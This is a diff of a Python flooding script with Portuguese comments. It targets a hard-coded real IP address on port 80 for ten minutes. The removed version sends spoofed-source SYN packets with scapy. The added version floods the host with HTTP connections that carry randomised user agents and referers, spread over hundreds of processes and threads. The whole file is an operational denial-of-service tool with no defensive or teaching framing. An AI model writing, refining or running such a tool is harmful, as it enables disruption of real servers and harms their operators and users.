@@ -1,108 +1,73 @@
-import sys
-import time
-import threading
-from multiprocessing import Process
-from scapy.all import *
+import socket
 import random
+import string
+import multiprocessing
+import threading
+import time
 
-target = "177.153.49.2"
-port = 80
-duration = 600  # Duração do ataque em segundos
-
-# Lista de User Agents
+# Lista de User Agents e referers
 user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.91 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.101 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.111 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.121 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.131 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.141 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.151 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.161 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.171 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.181 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.191 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.201 Safari/537.36",
-    # Adicione mais User Agents aqui
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 OPR/39.0.2256.71",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 OPR/39.0.2256.71",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
 ]
 
-# Lista de Referers
 referers = [
-    "http://www.google.com",
-    "http://www.bing.com",
-    "http://www.yahoo.com",
-    "http://www.youtube.com",
-    "http://www.facebook.com",
-    "http://www.amazon.com",
-    "http://www.wikipedia.org",
-    "http://www.twitter.com",
-    "http://www.instagram.com",
-    "http://www.linkedin.com",
-    "http://www.reddit.com",
-    "http://www.netflix.com",
-    "http://www.microsoft.com",
-    "http://www.apple.com",
-    "http://www.stackoverflow.com",
-    "http://www.github.com",
-    "http://www.twitch.tv",
-    "http://www.spotify.com",
-    "http://www.ebay.com",
-    "http://www.pinterest.com",
-    # Adicione mais Referers aqui
+    "https://www.google.com",
+    "https://www.bing.com",
+    "https://www.yahoo.com",
+    "https://www.duckduckgo.com",
+    "https://www.ask.com",
 ]
 
-# Adicionando mais User Agents
-for _ in range(13):
-    user_agents.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36")
+# Função para gerar uma string aleatória de tamanho especificado
+def random_string(length):
+    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
 
-# Adicionando mais Referers
-for _ in range(16):
-    referers.append("http://www.facebook.com")
+# Função para enviar requisições SYN
+def send_syn(ip, port, user_agent, referer):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ip, port))
+        s.settimeout(1)
+        s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {user_agent}\r\nReferer: {referer}\r\nConnection: keep-alive\r\n\r\n".encode())
+        s.close()
+    except:
+        pass
 
-def syn_flood(duration):
+# Função para iniciar o ataque SYN Flood com threads
+def syn_flood_threads(ip, port, user_agents, referers, num_threads, duration):
     start_time = time.time()
-    end_time = start_time + duration
-    while time.time() < end_time:
-        try:
-            ip_src = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
-            ip = IP(dst=target, src=ip_src)
-            tcp = TCP(dport=port, flags="S")
-            user_agent = random.choice(user_agents)
-            referer = random.choice(referers)
-            http = "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nReferer: {}\r\n\r\n".format(target, user_agent, referer)
-            pkt = ip / tcp / http
-            send(pkt, verbose=0)
-        except Exception as e:
-            print("Erro ao enviar pacote: {}".format(e))
+    while time.time() - start_time < duration:
+        user_agent = random.choice(user_agents)
+        referer = random.choice(referers)
+        send_syn(ip, port, user_agent, referer)
 
-def main():
-    threads = []
-    processes = []
-    duration_seconds = 600
-    for _ in range(4024):
-        thread = threading.Thread(target=syn_flood, args=(duration_seconds,))
-        process = Process(target=syn_flood, args=(duration_seconds,))
-        threads.append(thread)
-        processes.append(process)
+# Definição do alvo
+target_ip = "177.153.49.2"
+target_port = 80
 
-    print("Iniciando ataque SYN Flood em {}:{} por {} segundos.".format(target, port, duration))
-    for thread in threads:
-        thread.start()
-    for process in processes:
-        process.start()
+# Número de threads e processos
+num_threads = 512
+num_processes = 313
 
-    time.sleep(duration)
-    for thread in threads:
-        thread.join()
-    for process in processes:
-        process.join()
+# Duração em segundos
+duration = 600
 
-    print("Ataque SYN Flood concluído.")
+# Iniciar processos
+processes = []
+for _ in range(num_processes):
+    p = multiprocessing.Process(target=syn_flood_threads, args=(target_ip, target_port, user_agents, referers, num_threads, duration))
+    p.start()
+    processes.append(p)
 
-if __name__ == "__main__":
-    main()
+# Iniciar threads
+for _ in range(num_processes):
+    threading.Thread(target=syn_flood_threads, args=(target_ip, target_port, user_agents, referers, num_threads, duration)).start()
+
+# Esperar até que todos os processos terminem
+for p in processes:
+    p.join()
